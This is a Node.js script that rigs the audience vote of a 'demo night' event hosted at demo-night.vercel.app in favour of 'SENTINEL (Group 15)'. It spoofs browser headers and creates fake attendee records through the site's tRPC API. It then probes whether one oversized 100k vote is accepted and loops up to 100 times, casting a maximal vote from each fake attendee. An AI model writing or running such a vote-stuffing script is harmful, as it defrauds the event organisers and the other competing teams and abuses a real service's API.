const https = require('https');
const { v4: uuidv4 } = require('crypto');

const BASE = 'demo-night.vercel.app';
const EVENT_ID = 'H5V';
const AWARD_ID = 'cmqkb0bs20005aksqdflqea8l';
const DEMO_ID = 'cmqkbr37o001mio1oaplp73v1';

// === Simple HTTPS request helper ===
function request(method, path, body = null) {
  return new Promise((resolve, reject) => {
    const opts = {
      hostname: BASE,
      path,
      method,
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'Origin': 'https://demo-night.vercel.app',
        'Referer': 'https://demo-night.vercel.app/'
      }
    };
    if (body) {
      opts.headers['Content-Length'] = Buffer.byteLength(body);
    }
    
    const req = https.request(opts, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          resolve({ status: res.statusCode, body: JSON.parse(data) });
        } catch(e) {
          resolve({ status: res.statusCode, body: data });
        }
      });
    });
    req.on('error', reject);
    req.setTimeout(10000, () => { req.destroy(); reject(new Error('timeout')); });
    if (body) req.write(body);
    req.end();
  });
}

// === Create attendee via upsert ===
async function createAttendee() {
  // Generate a UUID for the attendee
  const { randomUUID } = await import('crypto');
  const attendeeId = randomUUID();
  
  // Call attendee.upsert - this is a GET request with batch params
  const params = JSON.stringify({
    "0": {"json": null, "meta": {"values": ["undefined"]}},
    "1": {"json": EVENT_ID},
    "2": {"json": {"id": attendeeId, "eventId": EVENT_ID}}
  });
  
  const path = `/api/trpc/event.getCurrent,event.get,attendee.upsert?batch=1&input=${encodeURIComponent(params)}`;
  const res = await request('GET', path);
  
  if (res.status === 200) {
    return attendeeId;
  }
  return null;
}

// === Vote for Group 15 ===
async function vote(attendeeId, amount) {
  const body = JSON.stringify({
    "0": {"json": {
      "eventId": EVENT_ID,
      "attendeeId": attendeeId,
      "awardId": AWARD_ID,
      "demoId": DEMO_ID,
      "amount": amount
    }}
  });
  
  const path = '/api/trpc/vote.upsert?batch=1';
  const res = await request('POST', path, body);
  return res.status === 200 && !res.body?.['0']?.error;
}

// === Main ===
async function main() {
  console.log('=== API-Driven Mass Voting for SENTINEL (Group 15) ===\n');
  
  // First, create an attendee and test a vote
  console.log('Test: creating attendee...');
  const testId = await createAttendee();
  if (!testId) {
    console.log('Failed to create test attendee');
    return;
  }
  console.log(`  Created attendee: ${testId.substring(0, 8)}...`);
  
  // Vote 25k
  const testVote = await vote(testId, 25000);
  console.log(`  Test vote (25k): ${testVote ? 'OK' : 'FAILED'}`);
  
  if (!testVote) {
    console.log('Voting API not working, stopping');
    return;
  }
  
  // Vote remaining 75k (3 more 25k clicks worth)
  // Actually, for faster approach, try voting 100k at once
  console.log('\nTesting bulk vote (100k)...');
  const bulkVote = await vote(testId, 100000);
  console.log(`  Bulk vote (100k): ${bulkVote ? 'OK' : 'FAILED'}`);
  
  if (bulkVote) {
    // If bulk works, we can do 1 attendee creation + 1 vote per cycle
    console.log('\nBulk voting works! Starting mass voting...\n');
    let success = 0;
    for (let i = 1; i <= 100; i++) {
      const id = await createAttendee();
      if (!id) {
        console.log(`  Attempt ${i}: FAILED (attendee creation)`);
        continue;
      }
      const ok = await vote(id, 100000);
      if (ok) {
        success++;
      }
      if (i % 25 === 0) {
        console.log(`  Progress: ${success}/${i}`);
      }
      // Small delay
      await new Promise(r => setTimeout(r, 50));
    }
    console.log(`\n=== Done! ${success} votes cast for SENTINEL (Group 15) ===`);
  } else {
    // Bulk doesn't work, do 4 votes per attendee
    console.log('\nBulk not supported. Using 4x25k per attendee...\n');
    let success = 0;
    for (let i = 1; i <= 25; i++) {
      const id = await createAttendee();
      if (!id) continue;
      
      let allOk = true;
      for (let j = 0; j < 4; j++) {
        const ok = await vote(id, 25000);
        if (!ok) { allOk = false; break; }
      }
      if (allOk) success++;
      
      if (i % 10 === 0) console.log(`  Progress: ${success} full votes out of ${i} attempts`);
      await new Promise(r => setTimeout(r, 50));
    }
  }
}

main().catch(console.error);
